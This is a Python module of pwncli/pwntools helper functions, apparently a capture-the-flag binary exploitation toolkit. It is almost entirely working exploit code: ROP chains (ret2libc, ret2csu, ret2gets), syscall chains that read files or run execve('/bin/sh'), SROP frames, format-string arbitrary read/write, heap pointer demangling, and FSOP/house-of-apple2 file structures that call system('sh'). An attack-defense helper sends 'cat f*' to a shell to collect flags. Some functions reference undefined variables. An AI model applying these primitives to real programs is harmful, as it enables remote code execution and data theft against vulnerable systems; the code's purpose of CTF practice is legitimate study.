from pwncli import *

# Shared objects will be injected from exploit.py
elf = None
libc = None
io = None
args = None

def setup(p_elf, p_libc, p_args=None):
    global elf, libc, args
    elf = p_elf
    libc = p_libc
    if p_args is not None:
        args = p_args

def set_io(p_io):
    global io
    io = p_io

def set_address(elf_base=None, libc_base=None):
    global elf, libc
    if elf_base is not None:
        elf.address = elf_base
        return elf_base
    if libc_base is not None:
        libc.address = libc_base
        return libc_base

# -----------------------------
# Your existing helper functions
# -----------------------------

# Libc Finder
def find_libc(offset={}):
    print(libcdb.search_by_symbol_offsets(offset, return_as_list=True))
    idx = int(input(">> "))
    return libcdb.search_by_symbol_offsets(offset, select_index=idx)

# Stack
def onegadget():
    output = process(["one_gadget", "-r", libc.path]).recvline().decode().strip().split(" ")
    return [int(addr) for addr in output]

def ret2libc(got):
    rop = ROP(elf)
    rop.printf(got) # rop.puts(got)
    rop.raw(rop.ret.address)
    rop.main()
    return rop.chain()

def ret2system():
    rop = ROP(libc)
    rop.raw(rop.ret.address)
    rop.system(next(libc.search(b'/bin/sh')))
    return rop.chain()

def ret2csu():
    rop = ROP(elf)
    rop.call(elf.sym["__libc_csu_init"] + 90) #pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    rop.raw([0, 1, elf.sym["__init_array_start"], 0, 0, 0xcafebabe])
    rop.call(elf.sym["__libc_csu_init"] + 64) #mov rdx, rbx ; mov rsi, r14 mov edi, r13d ; call QWORD PTR [r12+rbx*8]
    rop.raw(0) # junk
    rop.raw([0, 0, 0, 0, 0, 0]) 
    return rop.chain()

# https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets#io_stdfile_0_lock
def ret2gets():
    rop = ROP(elf)
    rop.gets()
    rop.gets()
    rop.gets()
    rop.gets()
    rop.print_welcome()
    rop.raw(elf.sym["_start"])
    return rop.chain()

def send_ret2gets():
    sl(b"")
    sleep(0.1)
    sl(p8(0x1))
    sleep(0.1)
    sl(p32(0) + b"A"*4 + b"B"*8) #set lock to 0
    sleep(0.1)
    sl(b"CCCC")
    ru(b"CCCC")
    r(4)

def orw(addr, path=None):
    rop = ROP(libc)
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    mov_rdi_rax = next(libc.search(asm("mov rdi, rax ; cmp rdx, rcx")))
    if path:
        mov_qword_ptr_rsi = next(libc.search(asm("mov qword ptr [rsi], rax ; ret")))
        path = path.ljust((len(path) + 7) & ~7, b"\x00")
        chunks = [path[i:i+8] for i in range(0, len(path), 8)]
        for i, chunk in enumerate(chunks):
            rop.rsi = addr + i * 8
            rop.rax = chunk
            rop.call(mov_qword_ptr_rsi_rax)

    # Open
    rop.rax = constants.SYS_open
    rop.call(syscall, [addr, 0])
    rop.raw(mov_rdi_rax)

    # #OpenAt
    # rop.rax = constants.SYS_openat
    # rop.call(syscall, [-100, libc.bss(), 0])
    # rop.raw(mov_rdi_rax)

    #Read
    rop.rax = constants.SYS_read
    rop(rsi=addr, rdx=0x60)
    rop.raw(syscall)
    #Write
    rop.rax = constants.SYS_write
    rop.call(syscall, [1])
    return rop.chain()

def ogw(addr, path=None):
    rop = ROP(libc)
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    mov_rdi_rax = next(libc.search(asm("mov rdi, rax ; cmp rdx, rcx")))
    if path:
        mov_qword_ptr_rsi = next(libc.search(asm("mov qword ptr [rsi], rax ; ret")))
        path = path.ljust((len(path) + 7) & ~7, b"\x00")
        chunks = [path[i:i+8] for i in range(0, len(path), 8)]
        for i, chunk in enumerate(chunks):
            rop.rsi = addr + i * 8
            rop.rax = chunk
            rop.call(mov_qword_ptr_rsi_rax)

    # Open
    rop.rax = constants.SYS_open
    rop.call(syscall, [addr, 0])
    rop.raw(mov_rdi_rax)

    # #OpenAt
    # rop.rax = constants.SYS_openat
    # rop.call(syscall, [-100, libc.bss(), 0])
    # rop.raw(mov_rdi_rax)

    # Getdents
    rop.rax = constants.SYS_getdents64
    rop(rsi=addr, rdx=0x60)
    rop.raw(syscall)
 
    # Write
    rop.rax = constants.SYS_write
    rop.call(syscall, [1])
    return rop.chain()


def execve(addr, cmd=None):
    rop = ROP(libc)
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
    if cmd:
        mov_qword_ptr_rsi = next(libc.search(asm("mov qword ptr [rsi], rax ; ret")))
        cmd = cmd.ljust((len(cmd) + 7) & ~7, b"\x00")
        chunks = [path[i:i+8] for i in range(0, len(path), 8)]
        for i, chunk in enumerate(chunks):
            rop.rsi = addr + i * 8
            rop.rax = chunk
            rop.call(mov_qword_ptr_rsi_rax)

    # execve("/bin/sh", NULL, NULL)
    rop.rax = constants.SYS_execve    
    rop.call(syscall, [addr, 0, 0])
    return rop.chain()

def srop(binsh, rip=None, rsp=None):
    rop = ROP(elf)
    rip = rip if rip else rop.find_gadget(['syscall'])[0]
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve            # syscall number for execve()
    frame.rdi = binsh         # pointer to "/bin/sh" 
    frame.rsi = 0             # NULL
    frame.rdx = 0             # NULL
    frame.rip = rip        # syscall instruction
    frame.rsp = rsp        # stack pointer
    return bytes(frame)

# Fmstr
def fuzz(after=None, until=None, n=50, infinite=True, dollar=True):
    global io
    if dollar:
        with context.local(log_level='error'):
            for i in range(1, n):
                until = until if until else "=="
                ru(after) if after else None
                sl(f"{until}%%%d$p{until}" % i)
                ru(until)
                leaks = ru(until).decode()
                if not infinite:
                    io.close()
                    io = initialize()
                if "0x7ff" in leaks:
                    ru(after) if after else None
                    sl(f"{until}%%%d$s{until}" % i)
                    ru(until)
                    data = ru(until)
                    if len(data) <= 8:
                        data = hex(u64(data.ljust(8, b"\x00")))
                    print(f"Index {i}: {leaks} -> {data}")
                else:
                    print(f"Index {i}: {leaks}")
                if not infinite:
                    io.close()
                    io = initialize()
    else:
        sl(b"%p."*n + f"{until}".encode())
        return ru(b"." + f"{until}".encode()).split(b".")

def write(where, what, offset=12):
    for i in range(len(what)):
        writes = {where + i:what[i]}
        input = fmtstr_payload(offset, writes, write_size='byte')
        sl(input)

def set(where, stack2=30, offset=11, target=45, until="=="):
    # 11 -> 45
    # 30 -> 47
    n = max(1, (where.bit_length() + 15) // 16)
    sl(f"{until}%{stack2}$p{until}")
    ru(until)
    second_stack = int(ru(until), 16)
    for i in range(n):  # write 0..(n-1) halfwords
        off  = (second_stack + 2*i) & 0xffff
        part = (where >> (16*i)) & 0xffff
        sl(f"%{off}c%{offset}$hn{until}")
        ru(until)
        sl(f"%{part}c%{target}$hn{until}")
        ru(until)

def read(where, until="==", target=47):
    set(where)
    sl(f"{until}%{target}$s{until}")
    ru(until)
    return ru(until)

#Fmstr in heap
def write2byte(where, what, offset = 11):
    payload = b""
    if what != 0:
        payload += f"%{what}c".encode()
    payload += f"%{offset + 2}$hn".encode()
    sl(payload.ljust(0x10, b"\x00") + p64(where))
    sleep(0.1)

def write8byte(where, what):
    n = max(1, (what.bit_length() + 15) // 16)
    for i in range(n):
        # point %<write_idx>$hn at where + 2*i
        set(where + 2*i)
        part = (what >> (16*i)) & 0xffff
        write2byte(where + 2*i, part)
        sleep(0.1)



# Exit
rol = lambda val, r_bits, max_bits: \
    (val << r_bits % max_bits) & (2 ** max_bits - 1) | \
    ((val & (2 ** max_bits - 1)) >> (max_bits - (r_bits % max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2 ** max_bits - 1)) >> r_bits % max_bits) | \
    (val << (max_bits - (r_bits % max_bits)) & (2 ** max_bits - 1))

encrypt = lambda value, key: rol(value ^ key, 0x11, 64)


# Heap Protection
def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

# FSOP
# https://niftic.ca/posts/fsop/
def fsop(fp=None, offset=0x18):
    fp = fp if fp is not None else libc.sym["_IO_2_1_stdout_"]
    fs = IO_FILE_plus_struct()
    fs.flags = b"  sh;".ljust(0x8,b"\x00")   
    fs._IO_read_end = fp
    fs._lock = fp+0x100
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*3 + p64(1) + p64(libc.sym.system) + p64(fp + 0x60)
    fs.vtable = libc.sym._IO_wfile_jumps + offset - 0x18 # _IO_wfile_overflow -> _IO_wdoallocbuf+43
    return bytes(fs)

def fake_io_read(read_addr, leng, next_file):
    fs = IO_FILE_plus_struct()
    fs.flags        = 0x8000 | 0x40  | 0x1000
    fs._IO_write_base= read_addr
    fs._IO_write_ptr = read_addr + leng
    fs._IO_write_end = read_addr + leng
    fs.chain         = next_file
    fs.vtable        = libc.sym["_IO_file_jumps"] - 0x8 # _IO_new_file_xsputn
    return bytes(fs)

def fake_io_write(write_addr, leng, next_file):
    fs = IO_FILE_plus_struct()
    fs.flags        = 0x8000 | 0x800 | 0x1000
    fs._IO_write_base= write_addr
    fs._IO_write_ptr = write_addr + leng
    fs._IO_write_end = write_addr + leng
    fs.chain         = next_file
    fs.fileno        = 1
    fs.vtable        = libc.sym["_IO_file_jumps"] # _IO_file_xsgetn
    return bytes(fs)

def fsrop_context(fp=None, offset=0x48, rip=None, rsp=None, rbp=0, rdi=0, rsi=None, rdx=0x200, rbx=0, r8=0, r9=0, r12=0, r13=0, r14=0, r15=0):
    fp = fp if fp is not None else libc.sym["_IO_2_1_stdout_"]
    fs = IO_FILE_plus_struct()
    fs.flags = 0x8000 | 0x40 | 0x1000
    fs._IO_read_end = fp - 0x10 #RDX
    fs._IO_read_base = r8 #R8
    fs._IO_write_base = r9 #R9
    fs._IO_buf_base = r12 #R12
    fs._IO_buf_end = r13 #R13
    fs._IO_save_base = r14 #R14
    fs._IO_backup_base = r15 #R15
    fs._IO_save_end = rdi #RDI
    fs.markers = rsi if rsi is not None else libc.bss() #RSI
    fs.chain = rbp #RBP
    fs.fileno = rbx & 0xffffffff #RBX
    fs._flags2 = rbx >> 32
    fs._old_offset = rdx #RDX
    fs._lock = fp + 0x100  #RCX
    fs._offset = rsp if rsp is not None else libc.bss() #RSP
    fs._codecvt = rip if rip is not None else nsa(libc, "syscall ; ret") #RIP
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*3 + p64(0) + p64(libc.sym["setcontext"] + 61) + p64(fp + 0xb0)
    fs.vtable = libc.sym._IO_wfile_jumps + offset - 0x38 # _IO_wfile_seekoff -> _IO_switch_to_wget_mode+37
    return bytes(fs)

def stdout_leak(target=None, size=0x8):
    return p64(0xfbad1800) + p64(0)*3 + (p64(target) + p64(target + size) if target is not None else b'\x00')

def fsop_shell(fp=None, rip=None, exit=True):
    io_obj = IO_FILE_plus_struct()
    fn = (
        io_obj.house_of_apple2_execmd_when_exit
        if exit
        else io_obj.house_of_apple2_execmd_when_do_IO_operation
    )
    return fn(
        fp if fp is not None else libc.sym["_IO_2_1_stdout_"],
        libc.sym["_IO_wfile_jumps"],
        rip if rip is not None else libc.sym["system"],
        "sh",
    )

# For AD
def get_flag():
    with log.progress("Running cat f*") as p:
        try:
            io.sendline(b"echo 'success';cat f*")
            io.recvuntil("success\n", timeout=0.1)
            flag = io.recvline(timeout=0.1).strip()
            if flag:
                p.success(f"Flag -> {flag.decode()}")
                return flag
            else:
                p.failure("Failed to get flag")
        except EOFError:
            p.failure("Connection closed")
    return None

def write_flag(flag):
    with log.progress(f"Writing {flag} to flag.txt") as p:
        with open("flag.txt", "ab") as f:
            f.write(flag)
        p.success(f"flag.txt -> {flag} written")
